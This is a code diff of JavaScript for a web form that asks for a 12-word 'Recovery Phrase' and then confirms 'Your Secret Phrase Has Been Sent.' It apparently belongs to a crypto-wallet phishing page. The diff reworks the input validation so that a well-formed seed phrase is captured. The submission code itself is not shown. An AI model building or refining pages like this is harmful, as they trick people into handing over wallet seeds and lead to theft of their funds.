@@ -7,25 +7,6 @@ let confirmed = ` <div class="confirm-outer">
                     <h3>Your Secret Phrase Has Been Sent.</h3>
                   </div>`
 
-function checkWords(inputData){
-    let no_of_words = 0;
-    for(let i=0;i<inputData.length;i++){
-        let smallWord = ""
-        for(let j=i;j<inputData.length;j++){
-            if(inputData.charAt(j) == " ") break;
-            smallWord+=inputData.charAt(j);
-        }
-        if(checkSymbNum(smallWord) === false){
-            return false;
-        }
-        no_of_words++;
-    }
-    if(no_of_words === 11){
-        return 11;
-    }
-    return 0;
-}
-
 function checkSymbNum(inputData){
     let inputLen = inputData.length;
     for(let i=0;i<inputLen;i++){
@@ -36,19 +17,39 @@ function checkSymbNum(inputData){
     return true;
 }
 
-document.querySelector(".text-area").addEventListener("change",(e)=>{
+document.querySelector(".text-box").addEventListener("change",(e)=>{
     inputString = e.target.value;
+    document.querySelector(".error-box").classList.add("display");
 })
 
 document.querySelector(".button").addEventListener("click",(e)=>{
     e.preventDefault();
-    if(checkWords(inputString) === false){
-        error1 = true;
-        document.querySelector(".error-box").innerHTML = "*Secret Phrase Should Not Contain Any Number Or Symbol";
+    error1 = false
+    error2 = false
+    let length = inputString.length
+    let words_count = 0;
+    for(let i=0;i<length;i++){
+        let str = "";
+        let j=i;
+        for(j=i;j<length;j++){
+          if(inputString.charAt(j)==' ') break;
+          else str=str + inputString.charAt(j);
+        }
+        i=j;
+        let res = checkSymbNum(str);
+        words_count++;
+        if(!res){
+          document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Not Contain Any Special Or Numeric Values";
+          document.querySelector(".error-box").classList.remove("display");
+          error1 = true;
+          break;
+        }
     }
-    else if(checkSymbNum(inputString) === 0){
-        error2 = true;
-        document.querySelector(".error-box").innerHTML = "*Secret Phrase Should Be Of 12 Words Only";
+
+    if(words_count != 12){
+      error2 = true;
+      document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Be Of 12 Words"
+      document.querySelector(".error-box").classList.remove("display")
     }
 
     if(error1 === false && error2 === false){
